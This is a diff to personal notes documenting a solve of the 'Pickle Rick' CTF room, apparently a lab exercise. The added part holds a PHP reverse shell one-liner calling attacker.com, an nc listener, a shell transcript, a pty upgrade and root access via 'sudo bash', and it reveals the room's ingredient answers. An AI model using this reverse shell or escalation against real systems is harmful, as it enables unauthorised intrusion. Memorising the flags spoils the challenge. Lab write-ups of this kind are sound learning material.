@@ -77,14 +77,14 @@ Finished
 ![[login.php.png]]
 
 > [!note]
-> Tested a few cmds and realised some work and some dont and revealed the following with:
+> Tested a few cmds and realised some work, some dont and revealed the following with:
 > ```
 > ls -la
 > ```
 > ![[ls -la.png]]
 
 > [!note]
-> Used cat cmd and it said it was disable:
+> Used cat cmd and it said it was disabled:
 ![[super ingredient file.png]]
 
 > [!note]
@@ -109,7 +109,7 @@ User www-data may run the following commands on ip-10-65-190-99:
 > ```
 
 > [!info]
-> Checked online and the last line above means I can run all cmds as whoeevr including root with no password required but Rick is not allowing certain cmds. Cheated again to find a grep cmd that can let you read everything as follows:
+> Checked online and the last line above means I can run all cmds as whoever including root with no password required but Rick is not allowing certain cmds. Cheated again to find a grep cmd that can let you read everything as follows:
 > ```
 > grep -R .
 > ```
@@ -134,3 +134,102 @@ clue.txt:Look around the file system for the other ingredient.
 > rabbit hole
 > ```
 
+> [!Note]
+> Upon realising I had CLI access with no restrictions and a .php login page - I thought about running a php reverse shell which I did find on GTFObins.org
+> ```
+> php -r '$sock=fsockopen("attacker.com",12345);exec("/bin/sh -i 0<&3 1>&3 2>&3");'
+> ```
+> I then setup a nc listener on port 12345 using my kali attack machine:
+> ```
+> nc -lvnp 12345
+> ```
+> I managed to get access, upgraded the shell via python cmd and got the 2nd ingredient:
+> ```
+>                                                                             
+┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 12345
+listening on [any] 12345 ...
+connect to [192.168.144.173] from (UNKNOWN) [10.66.151.31] 36390
+/bin/sh: 0: can't access tty; job control turned off
+$ python3 -c 'import pty ;pty.spawn("/bin/bash")'
+www-data@ip-10-66-151-31:/var/www/html$ export TERM=xterm
+export TERM=xterm
+www-data@ip-10-66-151-31:/var/www/html$ ls
+ls
+Sup3rS3cretPickl3Ingred.txt  clue.txt    index.html  portal.php
+assets                       denied.php  login.php   robots.txt
+www-data@ip-10-66-151-31:/var/www/html$ cd ..
+cd ..
+www-data@ip-10-66-151-31:/var/www$ cd ~
+cd ~
+www-data@ip-10-66-151-31:/var/www$ cd home      
+cd home
+bash: cd: home: No such file or directory
+www-data@ip-10-66-151-31:/var/www$ cd ..
+cd ..
+www-data@ip-10-66-151-31:/var$ cd /
+cd /
+www-data@ip-10-66-151-31:/$ ls
+ls
+bin   home            lib64       opt   sbin  tmp      vmlinuz.old
+boot  initrd.img      lost+found  proc  snap  usr
+dev   initrd.img.old  media       root  srv   var
+etc   lib             mnt         run   sys   vmlinuz
+www-data@ip-10-66-151-31:/$ cd h
+cd home/
+www-data@ip-10-66-151-31:/home$ cd r
+cd rick/
+www-data@ip-10-66-151-31:/home/rick$ cat "second ingredients"
+cat "second ingredients"
+1 jerry tear
+www-data@ip-10-66-151-31:/home/rick$ 
+> ```
+
+> [!success]
+> 1 jerry tear was the second ingredient
+
+> [!question]
+> What is the last and final ingredient?
+
+> [!info]
+> I tried to cd into root but I was denied so I'm guessing next protocol is to privilege escalate.
+
+> [!note]
+> After wasting time trying to find an exploit via crontabs/SUID/shadow/passwd - I didn't know you could simply run:
+> ```
+> sudo bash
+> ```
+> If you have permissions to run all cmds with no passwords via the info before:
+> ```
+> User www-data may run the following commands on ip-10-65-190-99:
+(ALL) NOPASSWD: ALL
+> ```
+> So now I have root shell and should easily get the last ingredient:
+> ```
+> www-data@ip-10-66-151-31:/etc$ sudo bash
+sudo bash
+root@ip-10-66-151-31:/etc# cd /
+cd /
+root@ip-10-66-151-31:/# ls
+ls
+bin   home            lib64       opt   sbin  tmp      vmlinuz.old
+boot  initrd.img      lost+found  proc  snap  usr
+dev   initrd.img.old  media       root  srv   var
+etc   lib             mnt         run   sys   vmlinuz
+root@ip-10-66-151-31:/# cd root 
+cdoot
+cdoot: command not found
+root@ip-10-66-151-31:/# cd root
+cd root
+root@ip-10-66-151-31:~# ls
+ls
+3rd.txt  snap
+root@ip-10-66-151-31:~# cat 3rd.txt
+cat 3rd.txt
+3rd ingredients: fleeb juice
+> ```
+
+> [!success]
+> fleeb juice
+
+![[Pickle Rick complete.png]]
